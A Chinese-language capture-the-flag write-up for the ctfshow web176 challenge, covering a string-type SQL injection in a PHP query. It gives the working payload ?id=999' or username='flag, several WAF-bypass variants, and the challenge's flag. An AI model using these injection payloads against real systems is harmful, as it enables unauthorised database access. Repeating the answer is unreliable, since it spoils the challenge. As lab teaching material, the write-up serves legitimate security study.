## ctfshow web176 解题笔记



### 📝 题目信息

- **题目名称**：web176
- **题目序号**：6/150
- **题目提示**：使用sqlmap是没有灵魂的
- **题目链接**：https://e85c1b8a-9eff-42e5-aa05-2b142eeab541.challenge.ctf.show/

### 🔍 源码审计

**查询逻辑：**

```php
// 拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user 
        where username !='flag' and id = '" .$_GET['id']."' limit 1;";
```

**过滤逻辑：**

```php
function waf($str){  
    // 代码过于简单，不宜展示  
}
// 对传入的参数进行了过滤
```

**数据库结构：**

| ID   | 用户名 | 密码                                          |
| :--- | :----- | :-------------------------------------------- |
| 26   | flag   | ctfshow{0a481980-98c1-46dc-be83-03d20205facc} |

### 🎯 漏洞分析

#### 1. 注入点定位

- 参数位置：`$_GET['id']`
- 注入类型：**字符型注入**
- 闭合方式：单引号 `'`

#### 2. 关键限制

```sql
where username !='flag'  -- 直接查询会被过滤掉flag用户
```

#### 3. WAF情况

题目说存在WAF但代码过于简单，测试发现：

- ✅ 单引号 `'` 可用
- ✅ 空格可用
- ✅ `or` 关键字可用
- ✅ `=` 可用

### 💥 解题过程

#### 第1步：测试注入存在

```bash
GET /?id=1' HTTP/1.1
```

页面报错，确认存在字符型注入。

#### 第2步：构造绕过逻辑

目标：绕过 `username !='flag'` 的限制

关键点：`and` 优先级高于 `or`

```bash
原始条件：username !='flag' and id = '$id'
注入后：username !='flag' and id = '999' or username='flag'
```

利用 `or` 添加一个恒真条件，只要 `or` 后面的条件成立，整个where条件就成立。

#### 第3步：最终payload

```bash
?id=999' or username='flag
```

#### 第4步：获取flag

返回页面显示：

| ID   | 用户名 | 密码                                          |
| :--- | :----- | :-------------------------------------------- |
| 26   | flag   | ctfshow{0a481980-98c1-46dc-be83-03d20205facc} |

### 📦 最终结果

```bash
flag：ctfshow{0a481980-98c1-46dc-be83-03d20205facc}
```

### 💡 知识点总结

| 知识点               | 说明                                     |
| :------------------- | :--------------------------------------- |
| **字符型注入**       | 需要闭合单引号 `'`                       |
| **逻辑运算符优先级** | `and` > `or`，可以利用 `or` 添加额外条件 |
| **简单WAF绕过**      | 本题WAF基本没过滤，最简单的payload就能过 |
| **limit 1的影响**    | 只返回一条数据，但flag用户正好是第一条   |

### 🔧 扩展思考

如果WAF稍微严格一点，可以尝试：

```sql
# 注释符绕过空格
999' or/**/username='flag

# 双写绕过
999' oorr username='flag

# URL编码
999'+or+username%3d'flag

# 括号改变优先级
999' or (username='flag')
```

**本题难度：⭐️ 简单**
**注入类型：字符型布尔注入**
**绕过技巧：利用and/or优先级**